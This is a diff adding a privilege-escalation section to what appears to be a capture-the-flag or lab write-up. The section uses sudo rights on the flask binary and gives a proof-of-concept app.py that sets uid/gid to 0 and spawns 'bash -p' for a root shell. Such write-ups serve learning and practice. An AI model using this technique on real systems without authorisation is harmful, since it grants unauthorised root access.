@@ -126,10 +126,54 @@ shell commands execution
 
 ![image](https://github.com/user-attachments/assets/718da839-4ff0-49c0-b15f-88ca7371fc6e)
 
+--------------------------
 
 ### PRIVESC with flask
 
 - I ran `sudo -l` and discovered that I can run `flask` binary as root.
+
+![image](https://github.com/user-attachments/assets/f2eb3cff-6a9f-4bca-9939-f56344b68fc0)
+
+- Poc for flask,save with `app.py`
+
+            #! /usr/bin/env python3
+            import os
+            from flask import Flask,render_template_string
+            
+            app = Flask(__name__)
+            os.setuid(0)
+            os.setgid(0)
+            os.system("bash -p")
+            
+            @app.route("/")
+            def index():
+                return render_template_string("Life tuff ooo!!!!")
+            
+            if __name__ == "__main__":
+               app.run(port=8080,debug=True)
+
+- Set the environmetal variables
+
+      export FLASK_APP=app.py
+      export FLASK_ENV=development
+
+- Root
+
+![image](https://github.com/user-attachments/assets/02781bf4-3d16-4e4e-9bd9-be8e23c07191)
+
+
+----------------------
+
+### REFERENCES
+
+- [Shell Command execution with Haskell](https://stackoverflow.com/questions/3470955/executing-a-system-command-in-haskell)
+  
+-----------------------
+
+### THANKS FOR READING
+
+-----------------------
+
 
 
 
